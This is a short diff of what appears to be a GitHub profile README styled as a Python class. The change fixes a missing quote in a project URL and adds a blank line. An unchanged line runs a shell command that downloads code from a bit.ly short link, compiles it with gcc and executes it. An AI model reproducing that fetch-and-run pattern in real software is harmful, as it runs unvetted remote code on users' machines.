@@ -9,7 +9,7 @@ class PROxZIMA:
     subprocess.call("curl -sL 'bit.ly/pr0x21m4' | gcc -w -o name -xc - && ./name", shell=True)
     self.bio = {
       '- 💼 I’m currently working for': {'Emerson' : 'https://www.emerson.com/en-us/global'},
-      '- 🔭 I’m currently working on' : {'Contribution Hub' : https://github.com/PROxZIMA/ContributionManager',
+      '- 🔭 I’m currently working on' : {'Contribution Hub' : 'https://github.com/PROxZIMA/ContributionManager',
                                          'DarkSpider': 'https://github.com/PROxZIMA/DarkSpider',
                                          'Prism'     : 'https://github.com/PROxZIMA/prism'},
       '- 🌱 I’m currently learning'   : ['System Architecture', 'C++', 'Full Stack Development', 'Algo Trading'],
@@ -116,6 +116,7 @@ if __name__ == '__main__':
 </p>
 
 ![](https://hit.yhype.me/github/profile?user_id=43103163)
+
 
 
 
